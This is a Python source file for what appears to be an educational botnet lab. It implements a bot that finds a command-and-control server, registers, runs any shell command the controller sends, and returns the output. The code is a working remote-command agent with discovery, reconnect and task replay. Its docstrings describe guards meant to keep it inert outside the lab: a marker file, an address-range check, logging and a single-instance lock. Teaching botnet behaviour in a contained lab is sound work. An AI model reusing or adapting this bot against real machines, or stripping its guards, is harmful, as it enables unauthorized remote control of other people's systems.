#!/usr/bin/env python3
"""The MiniLabs botnet lab payload.

The bot has no features. It finds a controller, registers, runs whatever shell
command the controller sends, and posts back what the shell printed. Everything
the population can do is therefore a command somebody typed, which is what a
commodity bot looks like and what keeps the capability list open-ended rather
than a menu whoever wrote this file chose.

Protocol, plaintext and line-based over TCP, on purpose, so that a capture a
learner takes at the router is legible without a dissector:

    ->  HELLO <id> <hostname> <ip>
    <-  OK                                  nothing to do
    <-  TASK <seq> <shell command>          pushed, or replayed on registration
    ->  RESULT <id> <seq> <exit> <bytes>
        <body, exactly <bytes> bytes>

The socket stays open between tasks. A bot that loses it goes back to looking
for a controller, which is what makes "kill the controller and the population
comes back" something a learner can watch rather than a claim.

A task runs under /bin/sh with four variables set that name the machine it
landed on: BOT_ID, BOT_HOST, BOT_ADDR, and BOT_OCTET for the host part of the
address. The first three are the values the HELLO line above already carries and
the fourth is derived from one of them, so none of them adds a capability. They
exist so that a task which has to differ per machine (the wordlist shard in the
handout's Part 3) says $(( BOT_OCTET % n )) rather than parsing the output of
`ip -o -4 addr show` in the middle of a one-liner.

SAFETY. This file is an unauthenticated remote shell, and the student release
of this lab goes in a public repository. Four guards keep it inert outside the
lab, and all four are here rather than in the handout, because a guard a
learner can skip by not reading is not a guard:

  1. It exits unless LAB_MARKER exists. That file is written into the lab image
     and exists nowhere else.
  2. Every candidate controller address is checked against LAB_NET at startup,
     and an address given on the command line is refused if it falls outside.
  3. There is no persistence, no re-exec, no self-copy and no encryption. Both
     ends write every command and every result to a log in the clear.
  4. Only one copy runs per machine: the pid file is held under an exclusive
     lock, so a second install finds the lock taken and exits.

The controller enforces the fifth guard, a hard cap on how many bots it will
register at once.
"""

import fcntl
import hashlib
import os
import random
import shlex
import socket
import subprocess
import sys
import time

# --- the four guards' constants -------------------------------------------
LAB_MARKER = "/etc/minilabs-lab"
LAB_NET = "128."                  # the lab's own /8; see check_candidates()
PIDFILE = "/run/minilabs/bot.pid"
LOGFILE = "/var/log/minilabs-bot.log"

# --- rendezvous ------------------------------------------------------------
#
# Eight candidate controller addresses on the lab's operator segment, shuffled
# on every pass, tried until one accepts. Two of them are the controller and
# six are assigned to nothing, so a pass that finds no controller is eight
# connection attempts and at most eight times CONNECT_TIMEOUT seconds.
#
# This list is the same set as C2_CANDIDATES in scripts/lib.sh, which is the
# lab's single source of truth for addressing. scripts/selftest.sh compares the
# two and fails if they have drifted apart.
C2_CANDIDATES = [
    "128.2.0.10", "128.2.0.17", "128.2.0.23", "128.2.0.34",
    "128.2.0.47", "128.2.0.58", "128.2.0.66", "128.2.0.85",
]
C2_PORT = 8080
CONNECT_TIMEOUT = 2.0             # seconds per candidate
PASS_WAIT = 5.0                   # seconds after a pass in which nothing accepted

# --- task execution --------------------------------------------------------
CMD_TIMEOUT = 120                 # a command that runs longer is killed
RESULT_CAP = 4096                 # bytes of output posted back; the rest is dropped


def log(msg):
    """Append one timestamped line to the bot's own log, and print it.

    Guard 3: the bot keeps a readable record of every command it was given and
    every result it sent. Nothing here is hidden from the machine it runs on.
    """
    line = "%d %s" % (int(time.time()), msg)
    try:
        with open(LOGFILE, "a") as fh:
            fh.write(line + "\n")
    except OSError:
        pass
    print(line, flush=True)


def check_marker():
    """Guard 1. Refuse to run anywhere but inside a lab container."""
    if not os.path.exists(LAB_MARKER):
        sys.stderr.write(
            "bot.py: %s is missing, so this is not a MiniLabs lab container.\n"
            "This payload runs nowhere else. Exiting.\n" % LAB_MARKER)
        sys.exit(1)


def check_candidates(candidates):
    """Guard 2. Every controller address must sit inside the lab's own /8."""
    for addr in candidates:
        if not addr.startswith(LAB_NET):
            sys.stderr.write(
                "bot.py: controller address %s is outside the lab network "
                "%s0.0.0/8. Refusing.\n" % (addr, LAB_NET))
            sys.exit(1)


def take_lock():
    """Guard 4. Hold the pid file under an exclusive lock for the whole run.

    A second copy of the payload installed on a machine that already runs one
    finds the lock taken and exits, so the standing task can be replayed over a
    segment as often as it likes without a host accumulating bots. The lock is
    released by the kernel when the process dies, which is what makes it
    correct after a kill -9 as well as after a clean exit.

    The handle is returned and kept alive by the caller: closing it would drop
    the lock.
    """
    os.makedirs(os.path.dirname(PIDFILE), exist_ok=True)
    fh = open(PIDFILE, "a+")
    try:
        fcntl.flock(fh.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
    except OSError:
        sys.stderr.write("bot.py: another copy already runs on this machine.\n")
        sys.exit(0)
    fh.seek(0)
    fh.truncate()
    fh.write("%d\n" % os.getpid())
    fh.flush()
    return fh


def own_address(peer):
    """The source address this machine would use to reach `peer`.

    A connected UDP socket sends nothing; the kernel picks the route and fills
    in the local address, which getsockname then reads back. That is how the
    bot reports the address a capture at the router will show, rather than
    whatever the first interface in the list happens to hold.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((peer, 9))
        return sock.getsockname()[0]
    except OSError:
        return "0.0.0.0"
    finally:
        sock.close()


def bot_id(hostname, addr):
    """A stable identifier for this machine.

    It is a digest of the hostname and the address rather than a random value,
    so a bot that is killed and installed again comes back as the same entry in
    the controller's roster instead of inflating the count. The roster is the
    lab's headline oracle and a count that grows when nothing was recruited
    would make it useless.
    """
    return hashlib.sha1(("%s|%s" % (hostname, addr)).encode()).hexdigest()[:8]


def discover(candidates, port):
    """Probe the candidate set in a fresh random order until one accepts.

    Returns a connected blocking socket. Loops until it finds one, because a
    controller that is not running yet is the ordinary case: the bot is
    installed by a command the operator typed before they started it.
    """
    while True:
        attempts = 0
        for addr in random.sample(candidates, len(candidates)):
            attempts += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECT_TIMEOUT)
            try:
                sock.connect((addr, port))
            except OSError:
                sock.close()
                continue
            sock.settimeout(None)
            log("rendezvous: %s:%d accepted after %d attempt(s) this pass"
                % (addr, port, attempts))
            return sock
        log("rendezvous: no controller in %d attempt(s); waiting %gs"
            % (attempts, PASS_WAIT))
        time.sleep(PASS_WAIT)


def task_env(ident, hostname, addr):
    """The environment a task runs in: the process environment plus who we are.

    A task the operator writes once runs on every machine in the population, so
    the useful ones need to know which machine they are on: a shard of a
    wordlist, a slice of an address range, a label on the output. Deriving that
    inside the command means parsing `ip addr` output in a one-liner, which was
    most of what made the guessing task in Part 3 unreadable.

    None of these is a capability. The bot already sent the first three to the
    controller in its HELLO line, and a command could read every one of them off
    the machine itself; exporting them only saves the command the parsing.

    BOT_OCTET is the host part of BOT_ADDR, the last dot-separated field. It is
    here rather than left to the task because the alternative a task has to
    write is ${BOT_ADDR##*.}, and `#` opens a comment in the handout's listings
    style, so a command carrying one cannot be typeset.
    """
    env = dict(os.environ)
    env["BOT_ID"] = ident
    env["BOT_HOST"] = hostname
    env["BOT_ADDR"] = addr
    env["BOT_OCTET"] = addr.rsplit(".", 1)[-1]
    return env


def run_task(command, env=None):
    """Run one shell command and return (exit status, captured output).

    Standard output and standard error are merged, because a learner reading a
    result wants what the command printed and not which stream it chose.
    A command that outruns CMD_TIMEOUT is killed and reported as 124, which is
    the status GNU timeout(1) uses for the same event.
    """
    try:
        proc = subprocess.run(
            ["/bin/sh", "-c", command],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            env=env,
            timeout=CMD_TIMEOUT)
        status, out = proc.returncode, proc.stdout
    except subprocess.TimeoutExpired as exc:
        status = 124
        out = (exc.output or b"") + b"\n[bot] killed after %ds\n" % CMD_TIMEOUT
    except OSError as exc:
        status, out = 127, str(exc).encode()
    if len(out) > RESULT_CAP:
        out = out[:RESULT_CAP]
    return status, out


def send_result(sock, ident, seq, status, body):
    header = "RESULT %s %d %d %d\n" % (ident, seq, status, len(body))
    sock.sendall(header.encode() + body)
    log("result: seq=%d exit=%d bytes=%d" % (seq, status, len(body)))


def session(sock, ident, hostname, addr, done):
    """Register, then serve tasks until the socket closes.

    `done` is the set of task sequence numbers this process has already run. A
    controller replays its standing task to everything that registers, which is
    what makes the population grow with nobody at the keyboard; without this
    set a bot that merely reconnected would run that task again every time.
    """
    sock.sendall(("HELLO %s %s %s\n" % (ident, hostname, addr)).encode())
    env = task_env(ident, hostname, addr)
    buf = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except OSError as exc:
            log("controller: connection lost (%s)" % exc)
            return
        if not chunk:
            log("controller: closed the connection")
            return
        buf += chunk
        while b"\n" in buf:
            line, buf = buf.split(b"\n", 1)
            line = line.decode(errors="replace").strip()
            if not line:
                continue
            parts = line.split(None, 2)
            verb = parts[0].upper()
            if verb == "OK":
                log("controller: registered, nothing to do")
                continue
            if verb == "FULL":
                log("controller: refused, its roster is full")
                return
            if verb != "TASK" or len(parts) < 3:
                log("controller: ignoring %r" % line)
                continue
            try:
                seq = int(parts[1])
            except ValueError:
                log("controller: ignoring %r" % line)
                continue
            if seq in done:
                log("task %d: already run by this process, skipping replay" % seq)
                continue
            done.add(seq)
            command = parts[2]
            log("task %d: %s" % (seq, command))
            status, body = run_task(command, env)
            try:
                send_result(sock, ident, seq, status, body)
            except OSError as exc:
                log("controller: result undeliverable (%s)" % exc)
                return


def main():
    check_marker()

    candidates = list(C2_CANDIDATES)
    port = C2_PORT
    argv = sys.argv[1:]
    if argv:
        # An explicit controller, for somebody working on the lab rather than
        # sitting it. Guard 2 applies to it exactly as it does to the list.
        candidates = [argv[0]]
        if len(argv) > 1:
            port = int(argv[1])
    check_candidates(candidates)

    lock = take_lock()                      # kept alive: closing it drops the lock
    hostname = socket.gethostname()
    addr = own_address(candidates[0])
    ident = bot_id(hostname, addr)
    log("start: id=%s host=%s addr=%s candidates=%d port=%d"
        % (ident, hostname, addr, len(candidates), port))

    done = set()
    while True:
        sock = discover(candidates, port)
        try:
            session(sock, ident, hostname, addr, done)
        finally:
            sock.close()
        time.sleep(1)

    lock.close()                            # unreachable; here for the reader


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
